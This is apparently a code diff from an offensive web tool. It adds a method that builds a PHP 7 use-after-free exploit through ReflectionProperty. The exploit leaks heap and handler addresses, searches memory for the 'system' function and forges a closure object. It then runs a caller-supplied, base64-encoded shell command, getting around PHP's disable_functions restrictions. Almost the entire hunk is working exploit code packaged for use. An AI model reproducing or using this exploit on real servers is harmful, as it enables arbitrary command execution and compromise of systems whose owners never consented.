@@ -1062,5 +1062,148 @@ pwn("${bin} -c \\\"".@base64_decode("${Buffer.from(cmd).toString('base64')}")."\
 }
 pwn("${bin} -c \\\"".@base64_decode("${Buffer.from(cmd).toString('base64')}")."\\\"");
 `;
+    },
+    PHP7_ReflectionProperty_UAF_EXP(bin, cmd){
+        return `
+        global $abc, $helper;
+        class Test {
+        public HelperHelperHelperHelperHelperHelperHelper $prop;
+        }
+        class HelperHelperHelperHelperHelperHelperHelper {
+        public $a, $b;
+        }
+        function s2n($str) {
+        $address = 0;
+        for ($i=0;$i<4;$i++){
+        $address <<= 8;
+        $address |= ord($str[4 + $i]);
+        }
+        return $address;
+        }
+        function s2b($str, $offset){
+        return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, "0",
+        STR_PAD_LEFT));
+        }
+        function leak($offset) {
+        global $abc;
+        $data = "";
+        for ($i = 0;$i < 8;$i++){
+        $data .= $abc[$offset + 7 - $i];
+        }
+        return $data;
+        }
+        function leak2($address) {
+        global $helper;
+        write(0x20, $address);
+        $leak = strlen($helper -> b);
+        $leak = dechex($leak);
+        $leak = str_pad($leak, 16, "0", STR_PAD_LEFT);
+        $leak = hex2bin($leak);
+        return $leak;
+        }
+        function write($offset, $data) {
+        global $abc;
+        $data = str_pad($data, 8, "\\x00", STR_PAD_LEFT);
+        for ($i = 0;$i < 8;$i++){
+        $abc[$offset + $i] = $data[7 - $i];
+        }
+        }
+        function get_basic_funcs($std_object_handlers) {
+        $prefix = substr($std_object_handlers, 0, 4);
+        $std_object_handlers = hexdec(bin2hex($std_object_handlers));
+        $start = $std_object_handlers & 0x00000000fffff000 | 0x0000000000000920; # change 0x920 if finding failed
+        $NumPrefix = $std_object_handlers & 0x0000ffffff000000;
+        $NumPrefix = $NumPrefix - 0x0000000001000000;
+        $funcs = get_defined_functions()['internal'];
+        for($i = 0; $i < 0x1000; $i++) {
+        $addr = $start - 0x1000 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $std_object_handlers || hexdec($name_addr) < $NumPrefix)
+        {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        $name = explode("\\x00", $name)[0];
+        if(in_array($name, $funcs)) {
+        return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, "0", STR_PAD_LEFT),
+        $std_object_handlers, $NumPrefix];
+        }
+        }
+        }
+        function getSystem($unknown_func) {
+        $unknown_addr = hex2bin($unknown_func[1]);
+        $prefix = substr($unknown_addr, 0, 4);
+        $unknown_addr = hexdec($unknown_func[1]);
+        $start = $unknown_addr & 0x00000000ffffffff;
+        for($i = 0;$i < 0x800;$i++) {
+        $addr = $start - 0x20 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
+        $unknown_func[3]) {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        if(strstr($name, "system")) {
+        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
+        "0", STR_PAD_LEFT))));
+        }
+        }
+        for($i = 0;$i < 0x800;$i++) {
+        $addr = $start + 0x20 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
+        $unknown_func[3]) {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        if(strstr($name, "system")) {
+        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
+        "0", STR_PAD_LEFT))));
+        }
+        }
+        }
+        $rp = new ReflectionProperty(Test::class, 'prop');
+        $test = new Test;
+        $test -> prop = new HelperHelperHelperHelperHelperHelperHelper;
+        $abc = $rp -> getType() -> getName();
+        $helper = new HelperHelperHelperHelperHelperHelperHelper();
+        if (strlen($abc) < 1000) {
+        exit("UAF Failed!");
+        }
+        $helper -> a = $helper;
+        $php_heap = leak(0x10);
+        $helper -> a = function($x){};
+        $std_object_handlers = leak(0x0);
+        $prefix = substr($php_heap, 0, 4);
+        //echo "Helper Object Address: " . bin2hex($php_heap) . "\\n";
+        //echo "std_object_handlers Address: " . bin2hex($std_object_handlers) . "\\n";
+        $closure_object = leak(0x10);
+        //echo "Closure Object: " . bin2hex($closure_object) . "\\n";
+        write(0x28, "\\x06");
+        if(!($unknown_func = get_basic_funcs($std_object_handlers))) {
+        die("Couldn't determine funcs address");
+        }
+        //echo "Find func's adress: " . $unknown_func[1] . " -> " . $unknown_func[0] . "\\n";
+        if(!($system_address = getSystem($unknown_func))) {
+        die("Couldn't determine system address");
+        }
+        //echo "Find system's handler: " . $system_address . "\\n";
+        for ($i = 0;$i < (0x130 / 0x08);$i++) {
+        write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *
+        $i)));
+        }
+        $abc[0x308 + 0x40] = "\\x01";
+        write(0x308 + 0x70, hex2bin($system_address));
+        write(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));
+        //echo "Fake Closure Object Address: " . bin2hex($prefix . hex2bin(str_pad(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08), 8, "0", STR_PAD_LEFT))) . "\\n";
+        ($helper -> a)("${bin} -c \\\"".@base64_decode("${Buffer.from(cmd).toString('base64')}")."\\\"");
+        `;
     }
+
 }
